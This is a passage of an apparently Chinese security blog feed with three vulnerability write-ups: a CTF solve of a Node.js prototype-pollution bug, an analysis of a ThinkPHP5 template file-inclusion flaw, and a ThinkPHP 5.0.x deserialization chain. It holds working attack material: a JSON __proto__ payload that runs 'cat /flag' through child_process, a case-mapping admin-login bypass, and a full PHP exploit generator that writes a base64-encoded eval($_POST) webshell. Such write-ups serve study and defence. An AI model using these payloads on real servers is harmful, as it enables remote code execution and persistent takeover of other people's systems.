passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)<br>    &#125;<br>  <br>  &#125;<br>  res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); ;<br>&#125;);<br>router.post(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.session.user.user!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.session.user.data = clone(req.body);<br>  res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br>router.get(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);<br>&#125;)<br><span class="hljs-built_in">module</span>.exports = router;<br><br></code></pre></td></tr></table></figure><p>调用clone的位置，需要先以admin身份登录</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">router.post(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.session.user.user!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.session.user.data = clone(req.body);<br>  res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br></code></pre></td></tr></table></figure><p>登录部分的处理逻辑，可以看到限制注册用户admin，大小写都不行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js">router.post(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(safeKeyword(req.body.userid))&#123;<br>    res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br>    req.session.user=&#123;<br>      <span class="hljs-string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),<br>      <span class="hljs-string">&#x27;passwd&#x27;</span>: req.body.pwd,<br>      <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>    &#125;<br>    res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); <br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.body.Submit==<span class="hljs-string">&quot;login&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!req.session.user)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;<br>    <span class="hljs-keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;<br>      req.session.user.isLogin=<span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>      res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)<br>    &#125;<br>  <br>  &#125;<br>  res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); ;<br>&#125;);<br></code></pre></td></tr></table></figure><p>用户名处使用了toUpperCase，可以用特殊字符注册绕过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase()<br></code></pre></td></tr></table></figure><p>参考</p><p><a href="https://imgtu.com/i/faTqWF"><img src="https://z3.ax1x.com/2021/08/11/faTqWF.png" alt="faTqWF.png"></a></p><p>注册用户</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">admı<span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure><p>成功以admin身份登录</p><p><a href="https://imgtu.com/i/faTod0"><img src="https://z3.ax1x.com/2021/08/11/faTod0.png" alt="faTod0.png"></a></p><p>现在来看看需要污染哪个参数</p><p>此处将 res 对象中的 <code>outputFunctionName</code> 属性渲染入 <code>index</code> 中，而 <code>outputFunctionName</code> 是未定义的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">router.get(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);<br>&#125;)<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/faTHiT"><img src="https://z3.ax1x.com/2021/08/11/faTHiT.png" alt="faTHiT.png"></a></p><p>修改为json格式的payload，同时还需要把Content-Type 设为 application/json（express框架支持根据Content-Type来解析请求Body，这里给我们注入原型提供了很大方便：）</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;lua&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;t=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()//&quot;</span>&#125;,<span class="hljs-attr">&quot;Submit&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/faTToV"><img src="https://z3.ax1x.com/2021/08/11/faTToV.png" alt="faTToV.png"></a></p><p>访问/info得到flag</p><p><a href="https://imgtu.com/i/faTLz4"><img src="https://z3.ax1x.com/2021/08/11/faTLz4.png" alt="faTLz4.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>寻找可以修改<code>__proto__</code>的地方（merge）</li><li>寻找合适的属性进行原型链污染（未被赋值，存在利用点）</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/242645">https://www.anquanke.com/post/id/242645</a></p><p><a href="https://www.anquanke.com/post/id/236182">https://www.anquanke.com/post/id/236182</a></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</a></p><p><a href="https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#%E5%8E%9F%E5%9E%8B">https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#%E5%8E%9F%E5%9E%8B</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp5文件包含漏洞分析</title>
    <link href="/2021/08/10/Thinkphp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2021/08/10/Thinkphp5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h1><p>漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong>。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>测试版本：5.0.18</p><p>控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;assign(request()-&gt;get());<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(); <span class="hljs-comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>创建 <strong>application/index/view/index/index.html</strong> 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错）</p><p><a href="https://imgtu.com/i/fY1InH"><img src="https://z3.ax1x.com/2021/08/10/fY1InH.png" alt="fY1InH.png"></a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>包含成功</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/public/</span>?cacheFile=<span class="hljs-number">22</span>.jpg<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/fY1HAI"><img src="https://z3.ax1x.com/2021/08/10/fY1HAI.png" alt="fY1HAI.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>1./thinkphp/library/think/Controller.php</p><p>进入assign方法</p><p><a href="https://imgtu.com/i/fY1O9f"><img src="https://z3.ax1x.com/2021/08/10/fY1O9f.png" alt="fY1O9f.png"></a></p><p>2./thinkphp/library/think/View.php</p><p>把$name数组赋值给了$this-&gt;data</p><p><a href="https://imgtu.com/i/fY1oBd"><img src="https://z3.ax1x.com/2021/08/10/fY1oBd.png" alt="fY1oBd.png"></a></p><p>3./thinkphp/library/think/Controller.php</p><p>进入fetch，四个参数都为空</p><p><a href="https://imgtu.com/i/fY14je"><img src="https://z3.ax1x.com/2021/08/10/fY14je.png" alt="fY14je.png"></a></p><p>4./thinkphp/library/think/View.php</p><p>调用think\view\driver\Think的fetch方法，第二个参数$vars是$this-&gt;data</p><p><a href="https://imgtu.com/i/fY1THA"><img src="https://z3.ax1x.com/2021/08/10/fY1THA.png" alt="fY1THA.png"></a></p><p>5./thinkphp/library/think/view/driver/Think.php</p><p>parseTemplateFile会获取默认模板文件的地址，也就是之前我们添加的文件，没有会报错。然后继续调用\think\template的fetch方法</p><p><a href="https://imgtu.com/i/fY1jgS"><img src="https://z3.ax1x.com/2021/08/10/fY1jgS.png" alt="fY1jgS.png"></a></p><p>6./thinkphp/library/think/Template.php</p><p>这里拼接了$cacheFile文件名，然后继续调用think\template\deiver\File的read方法，还是把$this-&gt;data作为参数</p><p><a href="https://imgtu.com/i/fY1X38"><img src="https://z3.ax1x.com/2021/08/10/fY1X38.png" alt="fY1X38.png"></a></p><p>7./thinkphp/library/think/tempplate/driver/File,php</p><p>最后调用extract进行变量覆盖，$cacheFile被覆盖为恶意文件，造成文件包含</p><p><a href="https://imgtu.com/i/fY1bNt"><img src="https://z3.ax1x.com/2021/08/10/fY1bNt.png" alt="fY1bNt.png"></a></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>先把 $cacheFile 变量存储在 $this-&gt;cacheFile 中，然后include $this-&gt;cacheFile ，避免变量覆盖</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>模板文件包含漏洞从thinkphp3开始就存在，过程并不复杂，主要步骤：</p><ol><li>我们传入的数组被赋值给$this-&gt;data</li><li>$this-&gt;data作为参数一路传递到extract方法，造成$cacheFile被覆盖成恶意文件名，最后include恶意文件</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Thinkphp5.0.x反序列化分析</title>
    <link href="/2021/08/05/Thinkphp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <url>/2021/08/05/Thinkphp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//__destruct</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Windows</span>&#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">files</span>=[];<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$pivot</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;files[]=<span class="hljs-variable">$pivot</span>; <span class="hljs-comment">//传入Pivot类</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//__toString Model子类</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Pivot</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">parent</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$output</span>,<span class="hljs-variable">$hasone</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;parent=<span class="hljs-variable">$output</span>; <span class="hljs-comment">//$this-&gt;parent等于Output类</span><br>            <span class="hljs-keyword">$this</span>-&gt;append=[<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-string">&#x27;getError&#x27;</span>];<br>            <span class="hljs-keyword">$this</span>-&gt;error=<span class="hljs-variable">$hasone</span>;   <span class="hljs-comment">//$modelRelation=$this-&gt;error</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//getModel</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Query</span><br>    &#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">model</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$output</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;model=<span class="hljs-variable">$output</span>; <span class="hljs-comment">//get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Output</span><br>    &#123;<br>        <span class="hljs-title">private</span> $<span class="hljs-title">handle</span> = <span class="hljs-title">null</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$styles</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$memcached</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;handle=<span class="hljs-variable">$memcached</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;styles=[<span class="hljs-string">&#x27;getAttr&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//Relation</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">HasOne</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">query</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$query</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;query=<span class="hljs-variable">$query</span>; <span class="hljs-comment">//调用Query类的getModel</span><br><br>            <span class="hljs-keyword">$this</span>-&gt;selfRelation=<span class="hljs-literal">false</span>; <span class="hljs-comment">//满足条件!$modelRelation-&gt;isSelfRelation()</span><br>            <span class="hljs-keyword">$this</span>-&gt;bindAttr=[<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-string">&#x27;admin&#x27;</span>];  <span class="hljs-comment">//控制__call的参数$attr</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span class="hljs-title">driver</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Memcached</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">handler</span> = <span class="hljs-title">null</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;handler=<span class="hljs-variable">$file</span>; <span class="hljs-comment">//$this-&gt;handler等于File类</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">File</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">options</span> = [<br>            &#x27;path&#x27;=&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;,<br>            <span class="hljs-string">&#x27;cache_subdir&#x27;</span>=&gt;<span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&#x27;prefix&#x27;</span>=&gt;<span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;data_compress&#x27;</span>=&gt;<span class="hljs-literal">false</span><br>        ];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tag</span>=<span class="hljs-literal">true</span>;<br><br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    $<span class="hljs-title">file</span>=<span class="hljs-title">new</span> <span class="hljs-title">think</span>\<span class="hljs-title">cache</span>\<span class="hljs-title">driver</span>\<span class="hljs-title">File</span>();<br>    <span class="hljs-variable">$memcached</span>=<span class="hljs-keyword">new</span> think\session\driver\Memcached(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$output</span>=<span class="hljs-keyword">new</span> think\console\Output(<span class="hljs-variable">$memcached</span>);<br>    <span class="hljs-variable">$query</span>=<span class="hljs-keyword">new</span> think\db\Query(<span class="hljs-variable">$output</span>);<br>    <span class="hljs-variable">$hasone</span>=<span class="hljs-keyword">new</span> think\model\relation\HasOne(<span class="hljs-variable">$query</span>);<br>    <span class="hljs-variable">$pivot</span>=<span class="hljs-keyword">new</span> think\model\Pivot(<span class="hljs-variable">$output</span>,<span class="hljs-variable">$hasone</span>);<br>    <span class="hljs-variable">$windows</span>=<span class="hljs-keyword">new</span> think\process\pipes\Windows(<span class="hljs-variable">$pivot</span>);<br><br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$windows</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>写入成功</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/public/a.php<span class="hljs-number">3</span>b<span class="hljs-number">58</span>a<span class="hljs-number">9545013</span>e<span class="hljs-number">88</span>c<span class="hljs-number">7186</span>db<span class="hljs-number">11</span>bb<span class="hljs-number">158</span>c<span class="hljs-number">44</span>.php<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/fekia4"><img src="https://z3.ax1x.com/2021/08/05/fekia4.png" alt="fekia4.png"></a></p><p>文件内容</p><p><a href="https://imgtu.com/i/fekFIJ"><img src="https://z3.ax1x.com/2021/08/05/fekFIJ.png" alt="fekFIJ.png"></a></p><h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><ol><li>thinkphp/library/think/process/pipes/Windows.php __destruct 调用removeFiles</li><li>removeFiles，调用file_exists触发__toString</li><li>thinkphp/library/think/Model.php __tostring-&gt;toJson-&gt;toArray 最终调用<code>__call</code></li><li>thinkphp/library/think/console/Output.php __call 调用Output类的block</li><li>thinkphp/library/think/console/Output.php block调用writeIn-&gt;write，最后调用$this-&gt;handle-&gt;write()，全局搜索write方法</li><li>thinkphp/library/think/session/driver/Memcached.php write方法调用$this-&gt;handle-&gt;set()，全局搜索set</li><li>thinkphp/library/think/cache/driver/File.php set调用file_put_contents写入文件，但是参数不可控，继续进入setTagItem</li><li>setTagItem再次调用set，此时参数可控，写入webshell</li></ol><p>1.thinkphp/library/think/process/pipes/Windows.php</p><p>起点：__destruct </p><p>调用removeFiles方法</p><p><a href="https://imgtu.com/i/feFh8I"><img src="https://z3.ax1x.com/2021/08/05/feFh8I.png" alt="feFh8I.png"></a></p><p>2.thinkphp/library/think/process/pipes/Windows.php</p><p>removeFiles中调用了file_exists，触发__toString</p><p><a href="https://imgtu.com/i/feFoKf"><img src="https://z3.ax1x.com/2021/08/05/feFoKf.png" alt="feFoKf.png"></a></p><p>3.thinkphp/library/think/Model.php</p><p>__toString-&gt;toJson-&gt;toArray：</p><p>执行到<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就能够执行Output类<code>__call</code>魔术方法</p><p><a href="https://imgtu.com/i/feF42t"><img src="https://z3.ax1x.com/2021/08/05/feF42t.png" alt="feF42t.png"></a></p><p><a href="https://imgtu.com/i/feF5xP"><img src="https://z3.ax1x.com/2021/08/05/feF5xP.png" alt="feF5xP.png"></a></p><p>详细看toArray</p><p>执行到<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code>就能够执行Output类<code>__call</code>魔术方法</p><p>需要让$value等于Output类</p><p>需要满足条件进入else分支</p><ol><li>$this-&gt;append不为空</li><li>$bindAttr</li></ol><p><a href="https://imgtu.com/i/feFTr8"><img src="https://z3.ax1x.com/2021/08/05/feFTr8.png" alt="feFTr8.png"></a></p><p>$value是包含__call方法的类，也就是Output类，$attr是传入的参数。来看一下$value和$attr的来源</p><p><strong>$value变量来源</strong></p><p>$value的赋值过程</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$modelRelation</span> = <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$relation</span>();<br><span class="hljs-variable">$value</span>         = <span class="hljs-keyword">$this</span>-&gt;getRelationData(<span class="hljs-variable">$modelRelation</span>);<br></code></pre></td></tr></table></figure><p>让$relation等于Model类的getError()，这样$modelRelation就等于$this-&gt;error，$modelRelation可控</p><p><a href="https://imgtu.com/i/feFbVg"><img src="https://z3.ax1x.com/2021/08/05/feFbVg.png" alt="feFbVg.png"></a></p><p>进入getRelationData，传入的$modelRelation必须是Relation类型，全局搜索找到符合要求的类HasOne</p><p>需要满足三个条件进入if分支，才能使$value可控，等于$this-&gt;parent</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$this</span>-&gt;parent &amp;&amp; !<span class="hljs-variable">$modelRelation</span>-&gt;isSelfRelation() &amp;&amp; get_class(<span class="hljs-variable">$modelRelation</span>-&gt;getModel()) == get_class(<span class="hljs-variable">$this</span>-&gt;parent)<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/feF7qS"><img src="https://z3.ax1x.com/2021/08/05/feF7qS.png" alt="feF7qS.png"></a></p><p>第一个条件：$this-&gt;parent就是$value的来源，等于Output类</p><p>来看一下如何满足第二个条件</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">!<span class="hljs-variable">$modelRelation</span>-&gt;isSelfRelation()<br></code></pre></td></tr></table></figure><p>HasOne类是OneToOne类的子类，同样继承了Relation</p><p>/thinkphp/library/think/model/Relation.php</p><p>isSelfRelation方法，需要让$this-&gt;selfRelation为false</p><p><a href="https://imgtu.com/i/feFXPs"><img 